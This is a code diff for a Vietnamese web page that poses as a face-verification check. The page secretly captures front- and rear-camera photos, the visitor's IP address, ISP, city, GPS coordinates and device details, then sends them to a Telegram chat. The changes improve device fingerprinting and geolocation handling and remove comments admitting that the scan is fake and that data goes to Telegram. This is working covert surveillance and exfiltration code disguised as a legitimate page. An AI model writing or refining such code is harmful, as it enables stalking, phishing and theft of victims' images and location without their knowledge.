@@ -390,7 +390,6 @@
     idleState.style.opacity = '0';
     setTimeout(() => idleState.style.display = 'none', 400);
     await vVideo.play();
-    // Đảo chiều video nếu là camera trước
     vVideo.style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
   }
 
@@ -439,9 +438,12 @@
     try {
       const ipRes = await fetch('https://api.ipify.org?format=json');
       const { ip } = await ipRes.json();
-      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=country,city,isp,lat,lon`);
+      const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=country,city,isp,lat,lon`);
       const geo = await geoRes.json();
-      return { ip, isp: geo.isp, city: geo.city, country: geo.country, lat: geo.lat, lon: geo.lon };
+      if (geo.status === 'success') {
+        return { ip, isp: geo.isp, city: geo.city, country: geo.country, lat: geo.lat, lon: geo.lon };
+      }
+      return null;
     } catch { return null; }
   }
 
@@ -459,8 +461,10 @@
     const ua = navigator.userAgent;
     if (/iPhone/.test(ua)) return 'iPhone';
     if (/iPad/.test(ua)) return 'iPad';
-    if (/Android/.test(ua)) return 'Android';
-    return 'Thiết bị khác';
+    if (/Android/.test(ua)) return 'Điện thoại Android';
+    if (/Windows/.test(ua)) return 'PC Windows';
+    if (/Macintosh/.test(ua)) return 'Mac';
+    return navigator.platform || 'Thiết bị khác';
   }
 
   function osName() {
@@ -468,7 +472,8 @@
     if (/Windows/.test(ua)) return 'Windows';
     if (/Mac OS/.test(ua)) return 'macOS';
     if (/Android/.test(ua)) return 'Android';
-    if (/iPhone|iPad/.test(ua)) return 'iOS';
+    if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
+    if (/Linux/.test(ua)) return 'Linux';
     return 'Khác';
   }
 
@@ -491,13 +496,14 @@
         const lat = gps ? gps.lat : ipInfo.lat;
         const lon = gps ? gps.lon : ipInfo.lon;
         if (lat) msg += `📍 Vĩ độ: ${lat}\n📍 Kinh độ: ${lon}\n📌 Maps: https://maps.google.com/?q=${lat},${lon}\n`;
+      } else {
+        msg += '🌍 IP: Không xác định được\n';
       }
       msg += '📸 Camera: ✅ Đã chụp trước, sau và kết thúc\n';
       msg += '⚠️ Ghi chú: Thông tin có thể chưa chính xác 100%.';
 
       await sendMessage(msg);
 
-      // Gửi ảnh
       if (beforeBlob) await sendPhoto(beforeBlob, 'Ảnh trước xác minh');
       if (backBlob) await sendPhoto(backBlob, 'Ảnh camera sau');
       if (afterBlob) await sendPhoto(afterBlob, 'Ảnh kết thúc');
@@ -541,33 +547,30 @@
     }
 
     try {
-      // Bắt đầu với camera trước
+      // Camera trước
       await openCamera('user');
       idleText.textContent = 'Đưa mặt vào khung';
       statusText.textContent = 'Đang chụp ảnh trước...';
       statusBar.classList.add('visible');
       scanOverlay.classList.add('active');
       setVerifyStep(1);
-
-      // Chụp ảnh trước
       await new Promise(r => setTimeout(r, 800));
       beforeBlob = await captureFrame();
 
-      // Chuyển sang camera sau
+      // Camera sau
       statusText.textContent = 'Đang chụp camera sau...';
       await openCamera('environment');
       idleText.textContent = 'Camera sau đang hoạt động';
       await new Promise(r => setTimeout(r, 1000));
       backBlob = await captureFrame();
 
-      // Quay lại camera trước để quét
+      // Quay lại camera trước và quét
       statusText.textContent = 'Quét khuôn mặt...';
       await openCamera('user');
       idleText.textContent = 'Đưa mặt vào khung';
       scanOverlay.classList.add('active');
       statusBar.classList.add('visible');
 
-      // Giả lập quét
       const messages = ['Phát hiện khuôn mặt...', 'Phân tích đặc điểm...', 'Xác minh con người...', 'Hoàn tất!'];
       let i = 0;
       statusText.textContent = messages[0];
@@ -601,10 +604,8 @@
     vBtnRetry.style.display = 'none';
     vBtnContinue.style.display = 'block';
 
-    // Chụp ảnh kết thúc
     try { afterBlob = await captureFrame(); } catch {}
 
-    // Gửi thông tin và ảnh qua Telegram
     await sendInfoAndPhotos();
 
     vBtnContinue.onclick = () => {
